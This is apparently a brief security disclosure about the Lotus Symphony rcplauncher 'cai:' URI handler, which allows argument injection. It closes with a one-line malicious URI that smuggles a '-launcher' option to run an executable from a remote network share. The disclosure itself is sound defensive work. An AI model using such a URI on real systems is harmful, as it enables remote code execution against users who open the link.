Hello,

I have found that the lotus expeditor rcplauncher as installed by lotus
symphony and possibly other products, registers a cai: uri handler.
This handler executes
"D:\Program Files\IBM\Lotus\Symphony\framework\rcp\rcplauncher.exe" -config
notes -com.ibm.rcp.portal.app.ui#openCA "%1"
the rcplauncher process accepts various arguments which can be abused to
execute arbitrary code.
The argument to the -launcher option for example is an executable that will
be executed.

malicious uri example:
cai:"%20-launcher%20\\6.6.6.6\d$\trojan
